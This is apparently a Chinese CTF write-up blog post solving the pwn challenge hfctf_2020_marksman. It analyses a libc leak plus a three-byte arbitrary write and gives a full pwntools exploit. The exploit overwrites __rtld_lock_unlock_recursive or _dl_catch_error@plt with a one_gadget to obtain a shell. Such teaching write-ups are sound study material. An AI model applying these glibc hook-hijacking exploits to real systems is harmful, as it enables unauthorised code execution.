# hfctf_2020_marksman



### 总结

根据本题，学习与收获有：

- `libc`的`got`表一般是可写的，保护一般是`Partial RELRO`，即`.got.plt`是可写的。
- `one_gadget`工具默认只会给出很容易滿足条件的`one_gadget`，其实还有一些隐藏的`one_gagdet`可以通过`-l/--level`来显示出来
- `exit`函数的调用链为`exit()->__run_exit_handlers->_dl_fini->__rtld_lock_unlock_recursive`，`__rtld_lock_unlock_recursive`是一个`hook`指针，可以劫持该函数指针写入`one_gadget`。一般来说，程序都会调用`__libc_start_main`，之后调用`exit`来退出。

<!-- more -->

### 题目分析

#### checksec

![image-20210421220656415](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210421220656415.png)

#### 函数分析

本题只包含一个`main`函数，因此，分析起来也很简单。

##### main

![image-20210421221038478](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210421221038478.png)

函数的关键流程为：

- 打印出`puts`函数的地址
- 读取`stdin`输入，并转化为一个`int64`的整数
- 读取`stdin`三个字符，存储到`bullets`数组中
- 修改指定内存地址的低`3`个字节

这里有一个`check_bullets`，可以跟进去看一下：

##### check_bullets

![image-20210421221833943](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210421221833943.png)

不允许数组的前两个元素同时为`0xc5`和`0xf2`，或者`0x22`和`0xf3`，或者`0x8c`和`0xa3`。

这是为了干啥呢？使用`one_gadget`工具一看，为了避免这些`gadget`：

![image-20210421222052135](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210421222052135.png)

#### 漏洞点

漏洞点很明显，有两处：

- 泄露出`puts`地址，等于给了`libc`基地址
- 任意地址写低`3`个字节

但是，也有一些掣肘，只有写`3`个字节，似乎还不能写`one_gadget`，那还能写啥呢。

### 利用思路

#### 知识点

1、一番思考，我去看了看`one_gadget`的参数，看是不是有啥有关`one_gadget`我还不知道的参数和命令。

![image-20210421222506770](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210421222506770.png)

有一个`--level`参数，可以输出更多的`one_gadget`。我们来试一试：

![image-20210421222712821](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210421222712821.png)

可以看到，的确是多了很多`one_gadget`，但是这些多出来的`one_gadget`的`constraints`约束更多了，不仅仅像之前的只需要`rsp + 0x40 == NULL`这么简单。但是，至少有可用的`one_gadget`可以试一试。

2、后来解出题后，网上搜了一下`wp`，发现[这位师傅](https://www.cnblogs.com/lemon629/p/14290240.html)的思路也值得借鉴。去寻找那些约束条件比较宽松的`one_gadget`上方附近有没有什么值得用的地址。有一个`0x10a38c`的`one_gadget`上方：

![image-20210421223309342](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210421223309342.png)

结合`exit`函数的调用链，劫持`__rtld_lock_unlock_recursive`指针，修改为`0x10a387`，可以绕过`check`，也能获取`shell`。但是我试了一下，这个劫持方式可能会失败，并不是百分百成功。

3、根据[这位博主](https://blog.csdn.net/SweeNeil/article/details/83744843)梳理的`dlopen`调用链，可以直到最后会调用`____libc_dlopen_mode`，最后会调用`_dl_catch_error`，因此，可以修改该`_dl_catch_error@plt+6`，更改为`one_gadget`

4、查看`puts`函数的调用链，可以看到，会调用`strlen`函数，因此，也可以修改`strlen@got`为`oe_gadget`。

#### 利用过程

利用思路一：

- 泄露`puts`函数地址，计算得到`__rtld_lock_unlock_recursive(0x81df60)`的偏移
- 修改`__rtld_lock_unlock_recursive`低三个字节为`0x10a387`

利用思路二：

- 泄露`puts`函数地址，计算得到`_dl_catch_error@plt+6`地址
- 修改`_dl_catch_error@plt+6(0x5f4038)`地址为`one_gadget(0xe569f)`

### EXP

#### 调试过程

这里重点调试思路二，同时解释一下，为啥要跳到`libc_base + 0x5f4038`

- 首先，泄露出地址，并计算出`libc`基地址，同时得到需要跳转的地址

  ```python
  sh.recvuntil("I placed the target near: ")
  msg = sh.recvline()
  
  puts_addr = int16(msg[:-1].decode())
  LOG_ADDR("puts_addr", puts_addr)
  libc_base_addr = puts_addr - 0x809c0
  LOG_ADDR("libc_base_addr", libc_base_addr)
  
  one_gadget1 = libc_base_addr + 0xe569f
  _dl_catch_error_offset = 0x5f4038
  target_addr = libc_base_addr + _dl_catch_error_offset
  ```

  ![image-20210421235945084](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210421235945084.png)

  ![image-20210422000022426](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422000022426.png)

- 然后，修改目标地址为`one_gadget`

  ```python
  sh.sendlineafter("shoot!shoot!\n", str(target_addr))
  input_gadget = one_gadget1
  for _ in range(3):
      sh.sendlineafter("biang!\n", chr(input_gadget & 0xff))
      input_gadget = input_gadget >> 8
  
  sh.interactive()
  ```

  ![image-20210422000101901](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422000101901.png)

- 获取`shell`

  ![image-20210422000200998](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422000200998.png)

接着来，解释一下，为啥是`0x5f4038`。需要设置断点在`dlopen`处：

![image-20210422000413255](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422000413255.png)

然后输入`si`，步进，发现最终会调用`_dl_catch_error`：

![image-20210422000540824](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422000540824.png)

会`call 0x7f64e0d2ad90`，所以继续跟进，看看`0x7f64e0d2ad90`是在做什么：

![image-20210422000646421](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422000646421.png)

会跳转到`rip+0x2022a2`处指向的地址，我们继续步进：

![image-20210422000919570](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422000919570.png)

发现这个地址就是`0x7f64e0f2d038`，所以看下这个地址是哪里，在干什么：

![image-20210422001035525](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422001035525.png)

这正是我们上面改的地址，存储着`_dl_catch_error@plt+6`，所以最终需要更改的偏移为`0x5f4038`：

![image-20210422001200763](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422001200763.png)

#### 完整exp

```python
from pwn import *
import functools

LOG_ADDR = lambda x, y: log.success('{} ===> {}'.format(x, hex(y)))
int16 = functools.partial(int, base=16)

sh = process("./hfctf_2020_marksman")

sh.recvuntil("I placed the target near: ")
msg = sh.recvline()

puts_addr = int16(msg[:-1].decode())
LOG_ADDR("puts_addr", puts_addr)
libc_base_addr = puts_addr - 0x809c0
LOG_ADDR("libc_base_addr", libc_base_addr)

one_gadget1 = libc_base_addr + 0x10a387
__rtld_lock_unlock_recursive_offset = 0x81df60
target_addr = libc_base_addr + __rtld_lock_unlock_recursive_offset

# one_gadget1 = libc_base_addr + 0xe569f
# _dl_catch_error_offset = 0x5f4038
# target_addr = libc_base_addr + _dl_catch_error_offset

sh.sendlineafter("shoot!shoot!\n", str(target_addr))
input_gadget = one_gadget1

for _ in range(3):
    sh.sendlineafter("biang!\n", chr(input_gadget & 0xff))
    input_gadget = input_gadget >> 8

sh.interactive()
```

最后远程攻击效果如下：

![image-20210422001633544](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210422001633544.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[exit 利用](https://www.cnblogs.com/lemon629/p/14290240.html)

3、[exit hook](https://blog.csdn.net/qq_43116977/article/details/105485947)

4、[dlopen 源码分析](https://blog.csdn.net/SweeNeil/article/details/83744843)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2021-04-21-hfctf-2020-marksman/  

